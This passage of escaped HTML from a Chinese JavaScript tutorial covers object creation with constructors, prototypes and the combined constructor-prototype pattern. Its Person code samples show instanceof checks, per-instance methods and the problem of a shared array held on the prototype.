rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 